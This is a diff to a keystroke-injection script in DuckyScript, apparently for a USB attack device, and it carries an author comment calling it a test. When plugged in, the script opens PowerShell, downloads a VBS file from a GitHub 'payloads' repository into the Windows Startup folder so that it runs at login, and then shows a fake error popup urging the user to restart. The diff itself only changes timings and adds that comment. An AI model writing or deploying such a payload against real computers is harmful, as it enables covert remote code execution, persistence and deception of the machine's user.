@@ -1,3 +1,4 @@
+REM Created by Frederik Amfelt for testing purpose
 GUI r
 DELAY 100
 STRINGLN shell:startup
@@ -5,11 +6,9 @@ DELAY 50
 ALT D
 DELAY 20
 STRINGLN POWERSHELL.exe 
-DELAY 100
-STRINGLN cd "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
-DELAY 50
+DELAY 200
 STRINGLN Invoke-WebRequest -Uri https://github.com/Fred-the-bot/payloads/blob/main/innocent_test.vbs -OutFile .\innocent.vbs
-DELAY 2000
+DELAY 1000
 STRINGLN $wshell = New-Object -ComObject Wscript.Shell
 DELAY 50
 STRINGLN $Output = $wshell.Popup("An error occured, please restart your PC",10,"ALERT",16)
